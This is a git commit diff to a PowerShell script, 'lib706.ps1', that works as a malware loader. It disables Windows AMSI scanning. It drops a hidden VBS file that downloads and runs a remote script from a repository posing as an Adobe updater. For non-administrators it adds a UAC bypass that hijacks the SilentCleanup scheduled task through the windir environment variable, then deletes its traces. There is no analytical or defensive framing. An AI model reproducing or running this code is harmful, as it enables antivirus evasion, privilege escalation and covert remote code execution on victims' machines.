2a417ad869e597018a880178b860fcaa6381d9c0
burnitup545 <96095116+burnitup545@users.noreply.github.com>
2021-12-17 10:06:34 -0800

    Update lib706.ps1

--- lib706.ps1
+++ lib706.ps1
@@ -1,2 +1,29 @@
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) 
-IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/Updater.ps1'))
+
+$VBS_file = @'
+mycommand = "powershell -w hidden -ex bypass -c iex ((NeW-object net.wEbclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/Updater.ps1'))"
+CreateObject("Wscript.Shell").Run mycommand, 0, false
+'@
+
+Set-Content -Path $env:temp\co.vbs -Value $VBS_file
+
+if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
+    #Payload goes here
+    #It'll run as Administrator
+    wscript $env:temp\co.vbs
+} else {
+    $registryPath = "HKCU:\Environment"
+    $Name = "windir"
+    
+    
+  
+    Set-ItemProperty -Path $registryPath -Name $name -Value "wscript $env:temp\co.vbs  "
+   
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
+    Start-Sleep -s 5
+    Remove-ItemProperty -Path $registryPath -Name $name
+}
+Start-Sleep -s 3
+Remove-Item -Path $env:temp\co.vbs
+
+Start-Sleep -s 7
